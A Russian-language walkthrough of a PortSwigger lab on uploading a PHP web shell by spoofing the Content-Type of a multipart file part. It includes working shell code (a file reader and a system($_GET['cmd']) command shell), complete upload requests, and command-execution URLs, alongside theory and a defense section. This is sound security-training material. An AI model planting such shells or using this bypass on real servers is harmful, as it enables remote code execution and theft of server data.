# 📘 PortSwigger Lab: Web shell upload via Content-Type restriction bypass

<a id="top"></a>

> 🔗 Лабораторная работа: https://portswigger.net/web-security/file-upload/lab-file-upload-web-shell-upload-via-content-type-restriction-bypass  
> 🎯 Тема: Unrestricted File Upload — обход проверки Content-Type  
> 🧪 Уровень: Apprentice  
> ✅ Статус: Solved  

---

## 📑 Содержание

- [🎯 Цель](#goal)
- [🧠 Краткая теория](#theory)
- [🧩 Ключевая идея](#idea)
- [🎭 Что такое Content-Type и почему ему нельзя доверять](#content-type)
- [🐚 Веб-шелл](#webshell)
- [⚡ Пейлоад эксплойта](#exploit)
- [🔍 Шаг 1 — Разведка функции загрузки](#step1)
- [🔍 Шаг 2 — Определить путь к файлам](#step2)
- [🔍 Шаг 3 — Попытка загрузки PHP-шелла и картирование фильтра](#step3)
- [🔍 Шаг 4 — Обход фильтра через подмену Content-Type](#step4)
- [🔍 Шаг 5 — Выполнение шелла и извлечение секрета](#step5)
- [📨 Примеры запросов](#requests)
- [📥 Пример результата](#response)
- [🧾 Полная цепочка атаки](#attack-chain)
- [🔬 Почему атака сработала](#breakdown)
- [🧠 Как думать как пентестер](#pentester)
- [🧪 Дополнительные проверки](#additional-tests)
- [❌ Типичные ошибки](#mistakes)
- [🛡 Защита](#defense)
- [✅ Чек-лист](#checklist)
- [🧾 Итог](#conclusion)

---

<a id="goal"></a>

## 🎯 Цель

Обойти проверку MIME-типа при загрузке файлов, чтобы:

```text
1. Загрузить PHP веб-шелл, замаскировав его под image/jpeg.
2. Выполнить шелл через GET-запрос к загруженному файлу.
3. Эксфильтровать содержимое /home/carlos/secret и отправить его как решение.
```

Учётные данные тестового пользователя:

```text
wiener:peter
```

---

<a id="theory"></a>

## 🧠 Краткая теория

При загрузке файлов через `multipart/form-data` браузер добавляет к каждой части заголовок:

```text
Content-Type: image/jpeg
```

Разработчики часто используют этот заголовок для валидации: «разрешены только изображения». Ошибка в том, что **Content-Type — это данные, контролируемые клиентом**: атакующий может подставить в него что угодно через Burp.

Валидация по Content-Type — классический пример доверия к неконтролируемому вводу:

```text
Клиент отправляет:  Content-Type: image/jpeg
Сервер верит:       «это изображение»
Реальность:         внутри — PHP-код
```

Заголовок описывает, **чем файл якобы является**, а не чем он является на самом деле. Для реальной проверки типа нужен анализ содержимого (magic bytes) на сервере.

---

<a id="idea"></a>

## 🧩 Ключевая идея

Расширение файла (`exploit.php`) проходит валидацию **без изменений** — фильтр проверяет только Content-Type части. Достаточно одного поля в запросе:

```text
filename="exploit.php"          ← остаётся как есть
Content-Type: image/jpeg        ← подменено с application/x-php
```

```text
Фильтр:  смотрит только Content-Type → видит image/jpeg → пропускает
Сервер:  сохраняет exploit.php в /files/avatars/
Клиент:  GET /files/avatars/exploit.php → PHP исполняется → RCE
```

---

<a id="content-type"></a>

## 🎭 Что такое Content-Type и почему ему нельзя доверять

В multipart-запросе каждая часть выглядит так:

```text
--------------------
Content-Disposition: form-data; name="avatar"; filename="exploit.php"
Content-Type: application/x-php

<?php ... ?>
--------------------
```

И `filename`, и `Content-Type` формируются **на стороне браузера атакующего**. Сервер получает их как текст и может сохранить файл с любым именем и любым «заявленным» типом.

Сравнение источников информации о типе файла:

```text
Content-Type из запроса  → контролируется атакующим  ✗ ненадёжен
Расширение файла         → контролируется атакующим  ✗ ненадёжен
Magic bytes содержимого  → определяется сервером     ✓ надёжен
```

Надёжная проверка читает первые байты файла (`FF D8 FF` — JPEG, `89 50 4E 47` — PNG) или пропускает файл через обработчик изображений.

---

<a id="webshell"></a>

## 🐚 Веб-шелл

Минимальный PHP-шелл для чтения целевого файла:

```php
<?php echo file_get_contents('/home/carlos/secret'); ?>
```

Универсальный вариант с выполнением команд:

```php
<?php echo system($_GET['cmd']); ?>
```

Для решения лабы достаточно первого.

---

<a id="exploit"></a>

## ⚡ Пейлоад эксплойта

Файл для загрузки (`exploit.php`):

```php
<?php echo file_get_contents('/home/carlos/secret'); ?>
```

Единственная модификация запроса загрузки — подмена Content-Type части файла:

```text
Content-Type: application/x-php   →   Content-Type: image/jpeg
```

---

<a id="step1"></a>

## 🔍 Шаг 1 — Разведка функции загрузки

1. Авторизоваться под `wiener:peter`.
2. Загрузить обычное изображение как аватар.
3. Вернуться на страницу аккаунта.

---

<a id="step2"></a>

## 🔍 Шаг 2 — Определить путь к файлам

В Burp → Proxy → HTTP history найти запрос раздачи аватара:

```http
GET /files/avatars/<YOUR-IMAGE> HTTP/1.1
```

Путь `/files/avatars/` — веб-доступная директория. Отправить этот запрос в Repeater (понадобится позже для вызова шелла).

---

<a id="step3"></a>

## 🔍 Шаг 3 — Попытка загрузки PHP-шелла и картирование фильтра

1. Создать локально `exploit.php`:

```php
<?php echo file_get_contents('/home/carlos/secret'); ?>
```

2. Попытаться загрузить его как аватар.

3. Ответ сервера раскрывает логику фильтра:

```text
You can only upload files with MIME type image/jpeg or image/png.
```

Картирование фильтра:

```text
Фильтр проверяет:   Content-Type части multipart-запроса
Разрешены:          image/jpeg, image/png
Расширение .php:    НЕ проверяется (ошибка разработчика)
```

---

<a id="step4"></a>

## 🔍 Шаг 4 — Обход фильтра через подмену Content-Type

1. В HTTP history найти исходный запрос загрузки:

```http
POST /my-account/avatar
```

и отправить в Repeater.

2. Найти в теле часть файла и заменить Content-Type:

```text
Было:  Content-Type: application/x-php
Стало: Content-Type: image/jpeg
```

Имя файла `filename="exploit.php"` **не трогать**.

3. Отправить запрос. Ответ:

```text
The file avatars/exploit.php has been uploaded.
```

Сервер принял файл с расширением `.php`, поверив заявленному Content-Type.

---

<a id="step5"></a>

## 🔍 Шаг 5 — Выполнение шелла и извлечение секрета

1. Перейти в Repeater-вкладку с запросом `GET /files/avatars/<YOUR-IMAGE>`.
2. Заменить имя изображения на `exploit.php`:

```http
GET /files/avatars/exploit.php HTTP/1.1
```

3. Отправить — сервер исполняет PHP, в ответе содержимое секрета:

```text
SECRET-VALUE-HERE
```

4. Отправить секрет через кнопку в баннере лабы.

Лаборатория получает статус:

```text
Solved
```

---

<a id="requests"></a>

## 📨 Примеры запросов

### Разведка: раздача аватара

```http
GET /files/avatars/avatar.png HTTP/1.1
Host: LAB-ID.web-security-academy.net
```

### Блокированная загрузка (эталон)

```http
POST /my-account/avatar HTTP/1.1
Host: LAB-ID.web-security-academy.net
Cookie: session=YOUR-SESSION-COOKIE
Content-Type: multipart/form-data; boundary=--------------------

--------------------
Content-Disposition: form-data; name="avatar"; filename="exploit.php"
Content-Type: application/x-php

<?php echo file_get_contents('/home/carlos/secret'); ?>
--------------------
Content-Disposition: form-data; name="user"

wiener
--------------------
Content-Disposition: form-data; name="csrf"

YOUR-CSRF-TOKEN
--------------------
```

Ответ:

```text
You can only upload files with MIME type image/jpeg or image/png.
```

### Рабочая загрузка — Content-Type подменён

```http
POST /my-account/avatar HTTP/1.1
Host: LAB-ID.web-security-academy.net
Cookie: session=YOUR-SESSION-COOKIE
Content-Type: multipart/form-data; boundary=--------------------

--------------------
Content-Disposition: form-data; name="avatar"; filename="exploit.php"
Content-Type: image/jpeg

<?php echo file_get_contents('/home/carlos/secret'); ?>
--------------------
Content-Disposition: form-data; name="user"

wiener
--------------------
Content-Disposition: form-data; name="csrf"

YOUR-CSRF-TOKEN
--------------------
```

### Запрос к шеллу

```http
GET /files/avatars/exploit.php HTTP/1.1
Host: LAB-ID.web-security-academy.net
```

---

<a id="response"></a>

## 📥 Пример результата

### Ответ рабочей загрузки

```text
The file avatars/exploit.php has been uploaded.
```

### Ответ шелла

```http
HTTP/1.1 200 OK
Content-Type: text/html; charset=UTF-8

SECRET-VALUE-HERE
```

Статус лаборатории:

```text
Solved
```

---

<a id="attack-chain"></a>

## 🧾 Полная цепочка атаки

```text
1. Авторизоваться под wiener:peter
2. Загрузить тестовое изображение, найти путь /files/avatars/ в HTTP history
3. Отправить GET-запрос раздачи аватара в Repeater
4. Попытаться загрузить exploit.php → получить сообщение о MIME-фильтре
5. Найти POST /my-account/avatar в HTTP history, отправить в Repeater
6. Заменить Content-Type части файла на image/jpeg (filename не менять)
7. Отправить → файл успешно загружен как avatars/exploit.php
8. В Repeater заменить имя изображения на exploit.php в GET /files/avatars/
9. Сервер исполняет PHP, секрет возвращается в ответе
10. Отправить секрет — лаба Solved
```

---

<a id="breakdown"></a>

## 🔬 Почему атака сработала

### 1. Валидация по клиентскому данным

`Content-Type` в multipart-запросе формируется на стороне атакующего. Проверка доверяет неконтролируемому вводу.

### 2. Фильтр проверяет только Content-Type

Расширение `filename="exploit.php"` проходит без проверки. Разработчик предположил, что MIME-тип и расширение всегда согласованы — это неверно.

### 3. Файл сохраняется с исходным именем в веб-доступную директорию

`/files/avatars/exploit.php` доступен по HTTP напрямую.

### 4. Сервер исполняет PHP в директории загрузок

PHP-интерпретатор обрабатывает `.php` в `/files/avatars/` — загруженный код становится выполняемым, что даёт RCE.

---

<a id="pentester"></a>

## 🧠 Как думать как пентестер

Встретив блокировку загрузки, всегда спрашивай:

```text
Что именно проверяется: расширение? Content-Type? содержимое?
```

```text
Content-Type и расширение — клиентские данные,
их можно менять независимо друг от друга.
```

Пробы для картирования фильтра:

```text
shell.php                 → определить базовую реакцию
shell.php + CT: image/jpeg → обход по Content-Type
shell.png (PHP внутри)    → обход по содержимому
SHELL.PHP                 → регистр
shell.php.jpg             → двойное расширение
```

Ошибка сервера, раскрывающая список разрешённых типов («only image/jpeg or image/png»), — бесплатная карта фильтра: она точно говорит, что и как проверяется.

---

<a id="additional-tests"></a>

## 🧪 Дополнительные проверки

В рамках разрешённой лаборатории можно сравнить:

### Подмена на image/png

```text
Content-Type: image/png  → тоже должен пройти (оба типа разрешены)
```

### Универсальный шелл с командами

```php
<?php echo system($_GET['cmd']); ?>
```

```text
GET /files/avatars/exploit.php?cmd=whoami
GET /files/avatars/exploit.php?cmd=ls+/home/carlos
```

### Проверка независимости проверок

```text
filename="exploit.php"  + Content-Type: image/jpeg  → проходит (Content-Type проверяется)
filename="exploit.txt"  + Content-Type: application/x-php  → исход зависит от фильтра
```

---

<a id="mistakes"></a>

## ❌ Типичные ошибки

### Ошибка 1. Менять filename вместе с Content-Type

Если заменить имя файла на `exploit.jpg`, сервер сохранит его как `.jpg` — PHP исполняться не будет. Менять нужно **только Content-Type**.

### Ошибка 2. Редактировать не ту часть multipart-тела

Content-Type меняется в части **файла** (`name="avatar"`), а не в заголовке всего запроса (`Content-Type: multipart/form-data` — его трогать нельзя).

### Ошибка 3. Не найти путь раздачи файлов до загрузки шелла

GET-запрос к `/files/avatars/` нужно взять из HTTP history заранее — иначе потом не с чем будет сверять путь.

### Ошибка 4. Использовать Content-Type из заголовка запроса

Валидируется Content-Type **части файла** внутри multipart-тела, а не заголовок `Content-Type: multipart/form-data; boundary=...`.

### Ошибка 5. Проверять исходник вместо исполнения

Если по запросу к шеллу возвращается PHP-код как текст — сервер не исполняет его в этой директории, и нужен другой вектор.

---

<a id="defense"></a>

## 🛡 Защита

### 1. Не валидировать по Content-Type из запроса

Клиентский заголовок — заявленный, а не фактический тип. Никогда не использовать его как единственную проверку.

### 2. Проверять содержимое (magic bytes)

Читать первые байты файла и сверять с ожидаемым форматом:

```text
JPEG: FF D8 FF
PNG:  89 50 4E 47
```

### 3. Переобработка изображения

Открыть файл библиотекой обработки изображений и пересохранить — встроенные полезные нагрузки удаляются.

### 4. Whitelist расширений

Разрешать только `jpg`, `jpeg`, `png`, `webp` — и отклонять всё остальное.

### 5. Случайные имена файлов

Генерировать имя на сервере (UUID), а не сохранять `exploit.php`.

### 6. Хранение вне веб-корня и запрет исполнения

Хранить загрузки вне исполняемых директорий; на уровне веб-сервера запрещать обработку скриптов в директории загрузок.

---

<a id="checklist"></a>

## ✅ Чек-лист

### Разведка

- [ ] Авторизован под wiener:peter
- [ ] Загружено тестовое изображение
- [ ] В HTTP history найден `GET /files/avatars/<image>` → путь раздачи
- [ ] GET-запрос отправлен в Repeater

### Картирование фильтра

- [ ] Загрузка `exploit.php` заблокирована
- [ ] Сообщение раскрывает фильтр: только image/jpeg и image/png
- [ ] Понято, что проверяется Content-Type части, а не расширение

### Эксплуатация

- [ ] В POST /my-account/avatar заменён Content-Type части на image/jpeg
- [ ] filename оставлен как exploit.php
- [ ] Файл загружен: `avatars/exploit.php`
- [ ] GET /files/avatars/exploit.php выполнен
- [ ] Секрет получен и отправлен
- [ ] Статус лабы: Solved

---

<a id="conclusion"></a>

## 🧾 Итог

Лаборатория решена через обход валидации по **Content-Type**:

```text
1. Фильтр доверяет клиентскому Content-Type части multipart-запроса
2. exploit.php загружен с подменённым Content-Type: image/jpeg
3. Расширение .php сохранилось — сервер исполняет шелл
4. GET /files/avatars/exploit.php → секрет прочитан
```

Главные выводы:

```text
Content-Type, filename и расширение — клиентские данные, им нельзя доверять.
```

```text
Проверка одного поля (MIME) при игнорировании другого (расширения) — типичный пробел в валидации.
```

```text
Сообщения об ошибках, раскрывающие правила фильтра, — бесплатная разведка для атакующего.
```

```text
Надёжная валидация: magic bytes + переобработка изображения + whitelist + запрет исполнения в директории загрузок.
```

---

[⬆ Вернуться к началу](#top)
